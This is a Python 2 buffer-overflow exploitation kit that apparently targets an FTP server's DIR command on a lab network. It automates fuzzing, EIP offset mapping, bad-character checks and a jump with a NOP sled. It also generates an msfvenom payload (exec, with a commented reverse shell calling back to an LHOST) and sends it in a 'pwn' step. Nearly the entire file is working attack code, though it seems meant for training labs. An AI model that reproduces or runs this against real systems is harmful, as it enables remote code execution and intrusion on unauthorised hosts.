#!/usr/bin/python
#
# K10's BufferOverflow Testing Kit
# 190201 KBI created
#
# Usage:
#   Set the parameter variables for what you want to include in the send packet
#   and what stage of the exploit testing you are doing. Then,
#
#   	$ bofkit <verb>
#
# Verbs are:
#   fuzz  	= send ever increasing buffers as you watch for the size that crashes server program.
#   mapoffset	= send location-codes buffer to find and calc where EIP is located.
#   eipcheck	= check to see if the pre_eip_len correctly lines up with the overflowed EIP register
#   int3 	= send test jump with payload of nops and int3 to prove control.
#   checkbad	= send all-chars buffer w/badchars removed to check for more bad chars.
#   genpayload	= generate msfvenom payload using parms set in the code.
#   pwn		= send a generated payload.

import sys, socket, os
from time import sleep

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <fuzz|mapoffset|eipcheck|mona|int3|checkbad|genpayload|pwn>\n"
    sys.exit()


#------------------------------------------------
# Set these parameters for functions

cmd = "DIR "		# cmd for the port protocol that will accept buffer

target_ip = "192.168.200.102"
# no quotes around target_port
target_port = 21

fuzz_start_size = 100
fuzz_step_size = 100
fuzz_max_size = 16384
fuzz_char = "A"

buf_total_size = 800
mapsize = 800		# must be a multiple of 4, maximum of 2000

#buf_pre_map_padding = 1000
buf_pre_map_padding = 0
buf_pre_char = "A"
buf_mid_size = 1000
buf_mid_char = "B"
buf_post_size = 1000
buf_post_char = "C"

pre_eip_len = 512
eip_jump = "\xf8\xfb\x8b\x01"
nop_sled = "\x90" * 20
int_test_char = "\xcc"

# add bad chars to this list as you find them
badchars = "\x00\x0a\x0d"

# ---- msfvenom parms ----
payload_file = "bofkit_payload.bin"
LHOST = "192.168.199.3"
# keep quotes around LPORT
LPORT = "4242"
EXITFUNC = "thread"
#SHELL = "windows/shell_reverse_tcp"
SHELL = "windows/exec"

# Leave encoding commented out if you want msfvenom to find the first encoding that works
# NOTE: ENCODING is presently unimplemented
ENCODING = ''
#ENCODING = "x86/fnstenv_mov"
#ENCODING = "x86/shikata_ga_nai"


#-------------------------------------------------
#                support functions
#-------------------------------------------------

# send_buffer
# Adjust this routine to send the commands and get the responses
#  as needed for the protocol and app you are testing

def send_buffer(cmd,buffer,target_ip,target_port):
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect((target_ip,target_port))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send("PASS test\r\n")
	s.recv(1024)
	s.send(cmd + buffer + '\r\n')
	s.recv(1024)
	#s.send('QUIT\r\n')
	#s.recv(1024)
	s.close()
	# -- sometimes a second connection triggers the overflow --
        #s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #connect=s.connect((target_ip,target_port))
	#sleep(1)
	#s.close()

def fuzz_buf(start_size,step_size,max_size,fuzz_char,target_ip,target_port,cmd):
	# Create an array of buffers, from 1 to x, each buffer incrementing in size
	buffer=[fuzz_char]
	counter=start_size

	while counter < max_size:
		buffer.append("A"*counter)
		counter=counter+step_size

	# Send out the buffers, gathering responses between each one
	for string in buffer:
		print "Fuzzing PASS with %s bytes" % len(string)
		send_buffer(cmd,string,target_ip,target_port)

	return true;


def get_allbytes( except_these ):
	allbytes = ''
	for i in range(256):
		if ( chr(i) not in except_these ):
			allbytes += chr(i)

	return allbytes


# get_pattern()
# Creates a pattern of 001A, 002A, 003A, etc.
# Find the nnnA number in the buffer that is at the spot just before the 
#  hilighted bomb spot in Immunity Debugger, multiply by 4, and add
#  any extra bytes to align it to the word boundry.

def get_pattern( mapsize ):
	if ( mapsize > 2000 ):
		print( "Maximum mapsize is 2000. Using 2000." )

	chars = ''
	for i in range(0x30, 0x35):
	    for j in range(0x30, 0x3A):
		for k in range(0x30, 0x3A):
		    chars += chr(i) + chr(j) + chr(k) + 'A'
	
	return chars[:mapsize]


def sendmap(buf_total_size, buf_pre_map_padding, mapsize, buf_pre_char, buf_post_char, badchars, target_ip, target_port, cmd):
	buf = ''
	buf += buf_pre_char * buf_pre_map_padding
        if buf_pre_map_padding + mapsize > buf_total_size:
                print "Total buffer size is too small for both pre-map padding and mapsize."
                return
	buf += get_pattern(mapsize)
	buf += buf_post_char * (buf_total_size - buf_pre_map_padding - mapsize)
	send_buffer( cmd, buf, target_ip, target_port )

def calcoffset(buf_pre_map_padding,mapsize):
        try:
                sys.argv[2]
        except IndexError:
                print "REQUIRES ADDITIONAL ARGUMENT:\nUse the contents of the EIP from the mapoffset run as the second argument, e.g. " + sys.argv[0] + " " + sys.argv[1] + " 41303131"
                return
        seq = sys.argv[2].decode("hex")         # codecs.decode("7061756c", "hex") will return a byte string in python 3 (but ascii in python 2)                                    
        # reverse this, since registers will load as big-endian - method info: https://docs.python.org/2/whatsnew/2.3.html#extended-slices                                             
        seq = seq[::-1]
        pos = seq.find("A")
        print "Flag identified as",seq
        if pos != 3 and pos != 0:
                print "I don't know how to convert this (mid-split) flag yet. Sorry!"
                return
        base = get_num(seq)
        r1 = base * 4
        print "Flag base offset is",r1
        if pos == 0:
                print "Add 1 for position shift"
                r1 = r1 + 1
        print "Add pre-map padding value of", buf_pre_map_padding
        print "OFFSET VALUE is", buf_pre_map_padding + r1

def get_num(x):
    return int(''.join(ele for ele in x if ele.isdigit()))

def check_eip(pre_eip_len, buf_pre_char, buf_mid_char, buf_post_char, buf_total_size):
	buf = ''
        buf += buf_pre_char * pre_eip_len
        buf += 4 * buf_mid_char
        buf += buf_post_char * (buf_total_size - pre_eip_len - 4)
        send_buffer( cmd, buf, target_ip, target_port )


def mona():
	print 'Handy mona commands for the Immunity Debugger on Windows:'
	print '	!mona modules (locate a vulnerable module)'
	print '	!mona find -s "\\xff\\xe4" -m <vulnerable module name>'
	print '	!mona find -s "\\x5c\\xc3" -m <vulnerable module name>'


def send_int3(pre_eip_len,buf_pre_char,eip_jump,nop_sled,int_test_char,target_ip,target_port,cmd):
	buf = ''
	buf += buf_pre_char * pre_eip_len
	buf += eip_jump
	buf += nop_sled
	buf += int_test_char
	send_buffer( cmd, buf, target_ip, target_port )


# check_badchars
# we'll load the badchars test to be just after the nop sled and int3 instruction in the buffer.
# this will not work if the nop instruction (usually \x90) or the int3 instruction are bad chars themselves.
def check_badchars(pre_eip_len, buf_pre_char, eip_jump, nop_sled, badchars, target_ip, target_port, cmd):
	buf = ''
        buf += buf_pre_char * pre_eip_len
        buf += eip_jump
        buf += nop_sled
        buf += int_test_char
	buf += get_allbytes( badchars )
        send_buffer( cmd, buf, target_ip, target_port )


def gen_payload(LHOST, LPORT, SHELL, EXITFUNC, badchars, ENCODING, payload_file):
	badstring = ''.join('{:02x}'.format(ord(x)) for x in badchars)
	my_cmd = "msfvenom -p " + SHELL + " LHOST=" + LHOST + " LPORT=" + LPORT + " EXITFUNC=" + EXITFUNC + " -b " + badstring + " -o " + payload_file
	# -- uncomment the line below to generate a simple calc.exe execution shell. Set SHELL = windows/exec (at top)
	#my_cmd = "msfvenom -p " + SHELL + " CMD=calc.exe" + " -b " + badstring + " -o " + payload_file
	print my_cmd
	os.system( my_cmd )
	return


def pwn(pre_eip_len, buf_pre_char, eip_jump, nop_sled, payload_file, target_ip, target_port, cmd):
        buf = ''
        buf += buf_pre_char * pre_eip_len
        buf += eip_jump
        buf += nop_sled
	#buf += "\xcc"		# uncomment to view payload after an int3 in debugger
	with open(payload_file, 'r') as myfile:
	    data = myfile.read()
        buf += data
        send_buffer( cmd, buf, target_ip, target_port )
	return


#-----------------------------------------------------------
#                  main logic
#-----------------------------------------------------------

if sys.argv[1] == 'fuzz':
	fuzz_buf(fuzz_start_size,fuzz_step_size,fuzz_max_size,fuzz_char,target_ip,target_port,cmd)
elif sys.argv[1] == 'mapoffset':
	sendmap(buf_total_size,buf_pre_map_padding,mapsize,buf_pre_char,buf_post_char,badchars,target_ip,target_port,cmd)
elif sys.argv[1] == 'calcoffset':
        calcoffset(buf_pre_map_padding,mapsize)
elif sys.argv[1] == 'eipcheck':
	check_eip(pre_eip_len, buf_pre_char, buf_mid_char, buf_post_char, buf_total_size)
elif sys.argv[1] == "mona":
	mona()
elif sys.argv[1] == 'int3':
	send_int3(pre_eip_len,buf_pre_char,eip_jump,nop_sled,int_test_char,target_ip,target_port,cmd)
elif sys.argv[1] == 'checkbad':
	check_badchars(pre_eip_len, buf_pre_char, eip_jump, nop_sled, badchars, target_ip, target_port, cmd)
elif sys.argv[1] == 'genpayload':
	gen_payload(LHOST, LPORT, SHELL, EXITFUNC, badchars, ENCODING, payload_file)
elif sys.argv[1] == 'pwn':
	pwn(pre_eip_len, buf_pre_char, eip_jump, nop_sled, payload_file, target_ip, target_port, cmd)
else:
	print "Command not supported."

